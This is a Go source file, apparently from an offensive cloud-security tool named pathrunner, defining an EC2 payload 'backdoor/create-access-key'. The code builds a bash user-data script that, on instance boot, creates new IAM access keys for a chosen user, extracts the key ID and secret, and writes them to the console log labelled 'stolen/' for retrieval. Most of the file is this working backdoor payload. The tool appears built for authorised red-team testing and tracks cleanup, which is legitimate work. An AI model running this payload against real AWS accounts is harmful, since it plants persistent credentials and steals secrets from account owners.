// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ec2

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

type BackdoorCreateAccessKeyPayload struct{}

func init() {
	payloads.Register(&BackdoorCreateAccessKeyPayload{})
}

func (p *BackdoorCreateAccessKeyPayload) GetName() string {
	return "backdoor/create-access-key"
}

func (p *BackdoorCreateAccessKeyPayload) GetDescription() string {
	return "Create access keys for an existing IAM user via EC2 user-data"
}

func (p *BackdoorCreateAccessKeyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceEC2,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorCreateAccessKeyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user name or ARN to create access keys for (auto-detects from ARN)",
			Required:    true,
		},
	}
}

func (p *BackdoorCreateAccessKeyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/create-access-key payload")
	}
	return nil
}

func (p *BackdoorCreateAccessKeyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	userName, _ := parsePrincipalARN(targetARN)

	userDataScript := fmt.Sprintf(`#!/bin/bash
exec > >(tee /var/log/pathrunner-create-access-key.log|logger -t pathrunner -s 2>/dev/console) 2>&1

echo "Pathrunner Create Access Key Payload"
echo "Target: %s"
echo ""

sleep 10

TARGET_USER="%s"

echo "Creating access key for user: $TARGET_USER..."
KEY_OUTPUT=$(aws iam create-access-key --user-name "$TARGET_USER" 2>&1)

if [ $? -ne 0 ]; then
    echo "FAILED: Could not create access key: $KEY_OUTPUT"
    exit 1
fi

AK_ID=$(echo "$KEY_OUTPUT" | grep -o '"AccessKeyId": "[^"]*"' | cut -d'"' -f4)
AK_SECRET=$(echo "$KEY_OUTPUT" | grep -o '"SecretAccessKey": "[^"]*"' | cut -d'"' -f4)

echo "Access key created successfully"

echo "--- PATHFINDER_IDENTITY_DATA ---"
echo "NAME=stolen/$TARGET_USER"
echo "TYPE=keys"
echo "ACCESS_KEY_ID=$AK_ID"
echo "SECRET_ACCESS_KEY=$AK_SECRET"
echo "AUTO_SWITCH=false"
echo "--- END_PATHFINDER_IDENTITY_DATA ---"

echo "Create access key payload complete"
`, userName, userName)

	return userDataScript, nil
}

func (p *BackdoorCreateAccessKeyPayload) ProcessResult(result string) (string, error) {
	var instanceData map[string]interface{}
	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
		return result, nil
	}

	var output strings.Builder
	output.WriteString("=== Create Access Key Payload Results ===\n\n")

	if instanceID, ok := instanceData["instance_id"].(string); ok {
		output.WriteString("Instance ID: " + instanceID + "\n")
	}

	if state, ok := instanceData["state"].(string); ok {
		output.WriteString("Instance State: " + state + "\n")
	}

	output.WriteString("\nThe EC2 instance will create access keys for the target user on boot.\n")
	output.WriteString("Allow 2-3 minutes for the script to complete.\n\n")

	output.WriteString("Credentials will be available in the instance console output.\n")
	output.WriteString("To retrieve: aws ec2 get-console-output --instance-id <INSTANCE_ID>\n\n")

	output.WriteString("Look for PATHFINDER_IDENTITY_DATA markers in the output for auto-import.\n")

	return output.String(), nil
}

func (p *BackdoorCreateAccessKeyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	userName, _ := parsePrincipalARN(options["TARGET_ARN"])

	return []modules.CreatedResource{
		{
			Type:          "iam:access-key",
			Name:          fmt.Sprintf("access-key/%s", userName),
			CleanupMethod: "iam:DeleteAccessKey",
			Metadata: map[string]string{
				"target_user": userName,
			},
		},
	}
}
